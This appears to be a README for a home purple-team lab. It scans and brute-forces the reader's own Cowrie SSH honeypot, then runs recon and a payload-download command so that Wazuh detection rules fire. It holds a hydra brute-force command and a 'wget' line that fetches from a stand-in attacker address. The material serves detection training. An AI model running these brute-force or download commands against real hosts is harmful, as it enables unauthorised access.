# Attack Simulation (Phase 4)

Controlled purple-team attacks against **your own** Cowrie honeypot on
`localhost:2222`. Everything here targets the local lab only.

> ⚠️ Only run these against your own honeypot. Brute-forcing or scanning hosts
> you don't own is illegal.

## Prerequisites

```powershell
pip install paramiko          # for the Python scripts
# (optional) install nmap for richer scans: https://nmap.org/download.html
```

## 1. Scan the honeypot, T1046 / T1021.004

```powershell
.\scan.ps1                    # or: nmap -sV -p 2222 127.0.0.1
```

## 2. Brute-force the SSH login, T1110 to T1078

```powershell
python brute_force.py
```
Tries 10 bad passwords (all fail) then `hunter2` (succeeds). This fires:
- **rule 100102** for each failure,
- **rule 100104** once 8 failures hit inside 120s (brute force),
- **rule 100103 / 100105** on the success (valid-account compromise).

## 3. Post-compromise activity, T1059 / T1082 / T1105

```powershell
python run_session.py
```
Logs in as `root:hunter2` and runs recon + download commands, firing rules
100106 (command), 100107 (recon), 100108 (payload download).

> The download URLs use `203.0.113.0/24` (TEST-NET-3, RFC 5737), reserved,
> non-routable documentation addresses, so nothing is actually fetched.

## 4. Manual exploration (optional, for screenshots)

```powershell
ssh -p 2222 root@localhost    # password: hunter2
# then run: uname -a ; id ; wget http://203.0.113.10/x ; exit
```

## After attacking

Open Wazuh to **Threat Hunting / Discover**, filter `rule.groups: cowrie`, and
watch the MITRE-tagged alerts appear. 📸 Screenshot the alert stream and each
dashboard panel for the README.

### Linux / Kali alternative (hydra)

If you prefer the classic tool from a Kali box on the same network:
```bash
hydra -l root -P passwords.txt ssh://<honeypot-ip>:2222 -t 4
nmap -sV -p 2222 <honeypot-ip>
```
